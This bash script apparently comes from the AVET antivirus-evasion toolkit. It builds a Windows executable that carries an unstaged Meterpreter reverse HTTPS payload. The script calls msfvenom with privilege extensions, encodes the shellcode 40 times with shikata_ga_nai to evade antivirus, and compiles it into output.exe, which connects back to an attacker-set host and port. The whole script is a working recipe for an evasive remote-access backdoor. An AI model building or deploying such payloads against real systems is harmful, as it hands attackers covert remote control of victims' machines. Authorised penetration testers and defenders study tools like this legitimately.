#!/bin/bash    
# Use unstaged meterpreter payload and apply shikata 40 times.

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter unstaged reverse payload, encoded 40 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter_reverse_https lhost=$LHOST lport=$LPORT extensions=stdapi,priv -e x86/shikata_ga_nai -i 40 -f c -a x86 --platform Windows > input/sc_c.txt

# set shellcode source
set_payload_source static_from_file input/sc_c.txt

# set decoder and key source
set_decoder none
set_key_source none

# set payload info source
set_payload_info_source none

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# don't enable debug output because printing the whole unstaged payload takes a lot of time
# enable_debug_print

# compile to output.exe file
$win32_compiler -o output/output.exe source/avet.c
strip output/output.exe

# cleanup
cleanup_techniques
